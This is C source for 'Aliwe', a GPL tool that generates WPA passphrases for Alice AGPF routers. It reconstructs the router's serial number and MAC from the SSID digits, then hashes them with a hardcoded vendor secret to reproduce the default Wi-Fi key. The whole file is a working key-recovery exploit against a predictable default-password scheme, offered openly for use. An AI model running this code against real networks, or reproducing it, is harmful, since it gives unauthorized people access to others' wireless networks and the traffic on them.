/*
 *  _______  __  __
 * |   _   ||  ||__|.--.--.--..-----.
 * |.  1   ||  ||  ||  |  |  ||  -__|
 * |.  _   ||__||__||________||_____|
 * |:  |   |
 * |::.|:. |
 * `--- ---'
 *
 *  Program to generate WPA key for AGPF Alice Routers.
 *  Coded by Gianluca Boiano.
 *
 *  This program is free software; you can redistribute it and/or modify
 * 	it under the terms of the GNU General Public License as published by
 *	the Free Software Foundation; either version 3 of the License, or
 *      (at your option) any later version.
 *
 *	This program is distributed in the hope that it will be useful,
 *	but WITHOUT ANY WARRANTY; without even the implied warranty of
 *	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *	GNU General Public License for more details.
 *
 *	You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *	Foundation, Inc., 51 Franklin Street - Fifth Floor, Boston, MA 02110-1301, USA.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <openssl/sha.h>


#define MAX 400
#define COL 32
#define THDIM 3
#define SNDIM 5
#define KDIM 2
#define QDIM 8
#define MACDIM 6
#define CMPMACDIM 12
#define CMPSN 13
#define ALISDIM 32
#define WPAKEYLEN 24
#define NUMPAD 3
#define SUBSTRDIM 7

unsigned char ALIS[ALISDIM] =
{

	0x64,0xC6,0xDD,0xE3,0xE5,0x79,0xB6,

	0xD9,0x86,0x96,0x8D,0x34,0x45,0xD2,

	0x3B,0x15,0xCA,0xAF,0x12,0x84,0x02,

	0xAC,0x56,0x00,0x05,0xCE,0x20,0x75,

	0x91,0x3F,0xDC,0xE8

};
unsigned char preinitcharset[256] =
{
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
	'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
	'4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
	'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
	'8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
	's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b',
	'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
	'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',
	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
	'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
	'4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
	'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2','3'
};



char* app_name;

struct s_data
{
	int threedigit;
	int sn;
	int k;
	int q;
	char mac[MACDIM];
};
typedef struct s_data magic;

struct s_results
{
	unsigned char macpad[MACDIM];
	char wpa[WPAKEYLEN];
};
typedef struct s_results results;

void print_usage(void);
void print_models(char mat[][COL], int riemp);
int read(char mat[][COL], magic vect[MAX]);
int searchngen(magic vect[MAX], int riemp, long int th);
void ssid2mac(char *mac,long int th,results *datatoprint);
void hashing(unsigned char *alis, char *sn,results *datatoprint);
void printtable(results *datatoprint,long int th,char *sn);

int main(int argc, char* argv[])
{

	int i;

	magic vect[MAX];
	char mat[MAX][COL];
	int modelsnum, foundentries=0;
	long int th;
	char *endptr;
	app_name = argv[0];

	print_usage();

	for (i=1; i<argc; i++)
		{
			if (!strcmp(argv[i], "-h"))
				{
					print_usage();
					return 0;
				}

			else if (!strcmp(argv[i], "-r"))
				{
					system("clear");
					modelsnum=read(mat,vect);
					if(modelsnum != -1)
						{
							system("clear");
							printf("%d entry in models file\n\n", modelsnum+1);
							print_models(mat,modelsnum);
						}
					else
						printf("models file not found or unaccessible\n");

				}


			else if (!strcmp(argv[i], "-s"))
				{

					if (i+1 >= argc )
						{
							fprintf(stderr, "%s: missing argument\n", app_name);
							return -1;
						}
					system("clear");
					modelsnum=read(mat,vect);
					if(modelsnum != 0)
						{
							printf("%d entry in <models> file\n\n", modelsnum+1);
							th = strtol(argv[i+1],&endptr,10);
							foundentries=searchngen(vect,modelsnum,th);
						}

					if(foundentries == -1)
						{
							printf("No entry found in <models> file\nReasons:\n\t*Your alice router isn't an AGPF model\n\t*Your <models> file isn't updated\n");
							return -1;
						}
					else
						    printf("\nFound %d entries\n", foundentries);
							return 0;

				}
		}
    return 0;
}




void print_usage(void)
{
	fprintf(stderr, "\nAliwe   ---  A wpa passphrase generator for AGPF Alice routers\n");
	fprintf(stderr, "usage: wpagen [<opts>]\n");
	fprintf(stderr, "  <opts>  -h                       print this message\n");
	fprintf(stderr, "          -r                       read from models file and print on console\n");
	fprintf(stderr, "          -s  <SSID digits>        wpa passphrase generation based on SSID digits\n");
	fprintf(stderr, "\n\nCoded by Gianluca Boiano  -  v0.2\n");
}


int read(char mat[][COL], magic vect[MAX])
{
	int j,i=0,t;
	char *temp;
	char *endptr;
	FILE *fp;
	fp=fopen("/usr/share/aliwe/models", "r");
	if(fp !=NULL)
		{
			while(!feof(fp) && i<MAX)
				{
					fscanf(fp,"%s",mat[i]);
					i++;
				}

			fclose(fp);

			for(j=0; j<=i; j++)
				{
					if(strlen(mat[j]) == 30)
						{

							temp = (char*)calloc(1,sizeof(char));
							temp[0]=mat[j][11];
							vect[j].k = strtol(temp,&endptr,10);
							free(temp);
							temp = (char*)calloc(THDIM,sizeof(char));
							for(t=0; t<THDIM; t++)
								{
									temp[t]=mat[j][t+1];

								}
							vect[j].threedigit = strtol(temp,&endptr,10);
							free(temp);
							temp = (char*)calloc(SNDIM,sizeof(char));
							for(t=0; t<SNDIM; t++)
								{
									temp[t]=mat[j][t+5];
								}
							vect[j].sn = strtol(temp,&endptr,10);
							free(temp);
							temp = (char*)calloc(QDIM,sizeof(char));
							for(t=0; t<QDIM; t++)
								{
									temp[t]=mat[j][t+13];
								}
							vect[j].q = strtol(temp,&endptr,10);
							free(temp);
							for(t=0; t<MACDIM; t++)
								{
									vect[j].mac[t]=mat[j][t+22];
								}
						}
					else
						{
							temp = (char*)calloc(KDIM,sizeof(char));
							for(t=0; t<KDIM; t++)
								{
									temp[t]=mat[j][t+11];
								}
							vect[j].k = strtol(temp,&endptr,10);
							free(temp);
							temp = (char*)calloc(THDIM,sizeof(char));
							for(t=0; t<THDIM; t++)
								{
									temp[t]=mat[j][t+1];
								}
							vect[j].threedigit = strtol(temp,&endptr,10);
							free(temp);
							temp = (char*)calloc(SNDIM,sizeof(char));
							for(t=0; t<SNDIM; t++)
								{
									temp[t]=mat[j][t+5];
								}
							vect[j].sn = strtol(temp,&endptr,10);
							free(temp);
							temp = (char*)calloc(QDIM,sizeof(char));
							for(t=0; t<QDIM; t++)
								{
									temp[t]=mat[j][t+14];
								}
							vect[j].q = strtol(temp,&endptr,10);
							free(temp);
							for(t=0; t<MACDIM; t++)
								{
									vect[j].mac[t]=mat[j][t+23];
								}

						}
				}

			return i;
		}
	else return -1;

}

void print_models(char mat[][COL], int riemp)
{
	int i;
	for(i=0; i<riemp; i++)
		printf("%s\n", mat[i]);

}


int searchngen(magic vect[MAX], int riemp,long int th)
{
	int i,tmp,j=0;
	char *buffer;
    results datatoprint[NUMPAD];

	tmp = (int) th/100000;

    for(i=0; i<riemp; i++)
		{
			if(vect[i].threedigit == tmp)
				j++;

		}
	if(j==0)
		return -1;
	else
		{
			printf("\nSummary for Alice-%d:\n\n", th);
			
			for(i=0; i<riemp; i++)
				{
					if(vect[i].threedigit == tmp)
						{
							buffer = (char*)calloc(13,sizeof(char));
							sprintf(buffer,"%dX%07ld", vect[i].sn,(th-vect[i].q)/vect[i].k);
							printf("\nSerial Number:");
							printf("\n%s\n\n",buffer);
							printf("For this SN you can have these MACs\t\tand relative keys:\n");
							ssid2mac(vect[i].mac,th,datatoprint);
							hashing(ALIS,buffer,datatoprint);						    
						    printtable(datatoprint,th,buffer);



						}

				}
		}

	return j;

}

void ssid2mac(char *mac,long int th,results *datatoprint)
{
	int z,i,j,thcycle;
	int byte;
	char *completemac; /*mac completo ma ancora in stringa*/
	char *substrmac; /*2a parte del mac temporaneo generato dal ssid da normalizzare*/
	char *substrmac_normalized;/*2a parte del mac temporaneo generato dal ssid da normalizzare pad1*/
	unsigned char *cmpmacbyte;/*mac convertito in byte*/


	for(z=0; z<NUMPAD; z++)
		{
			cmpmacbyte = (unsigned char*)calloc(MACDIM,sizeof(unsigned char));
			substrmac=(char*)calloc(SUBSTRDIM,sizeof(char));
			substrmac_normalized=(char*)calloc(SUBSTRDIM,sizeof(char));
			completemac=(char*)calloc(CMPMACDIM,sizeof(char));
			thcycle= th+(100000000*z);
			sprintf(substrmac,"%2X", thcycle); /*conversione da ssid a mac con */
			j=0;
			for(i=1; i<SUBSTRDIM; i++)
				{
					substrmac_normalized[j]=substrmac[i];
					j++;
				}
			strcpy(completemac,mac);
			strcat(completemac,substrmac_normalized);



			j=0;
			for(i=0; i<CMPMACDIM; i++)
				{
					/*converto ogni 2 lettere della stringa completemac in un intero
					 * per poi convertire l'intero in esadecimale e farlo corrispondere ad 1 byte*/
					sscanf(&completemac[i], "%02x", &byte);
					cmpmacbyte[j] = (unsigned char)byte;
					j++;
					i++;
				}

			memcpy(datatoprint[z].macpad,cmpmacbyte,MACDIM*sizeof(unsigned char));

			free(cmpmacbyte);
			free(substrmac);
			free(substrmac_normalized);
		  /*free(completemac);*/
		}

}


/*questa è la funzione di grande interesse:th è il ssid passato a riga di comando, mac va converitito
 * in sequenza di byte e alis e sn così come sono*/
void hashing(unsigned char *alis, char *sn,results *datatoprint)
{


	unsigned char hash[SHA256_DIGEST_LENGTH];
	SHA256_CTX sha256;

	int i,j,hex2index;
	char *wpakey;
	for(i=0; i<NUMPAD; i++)
		{
			SHA256_Init(&sha256);
			SHA256_Update(&sha256, alis, ALISDIM);
			SHA256_Update(&sha256, sn, CMPSN);
			SHA256_Update(&sha256, datatoprint[i].macpad, MACDIM);
			SHA256_Final(hash, &sha256);
			wpakey=(char*)calloc(WPAKEYLEN,sizeof(char));

			for(j=0; j<WPAKEYLEN; j++)
				{
					hex2index=(int) hash[j];
					wpakey[j]=preinitcharset[hex2index];

				}

			strcpy(datatoprint[i].wpa,wpakey);
			free(wpakey);

		}
}

void printtable(results *datatoprint,long int th,char *sn)
{
	int i,j;
	for(i=0;i<NUMPAD;i++)
	{
		printf("\nwith pad %d:\t",i);
		for(j=0;j<MACDIM;j++)
			printf("%02X",datatoprint[i].macpad[j]);
			printf("\t\t\t%s\n",datatoprint[i].wpa);
			
		
	}
	


}
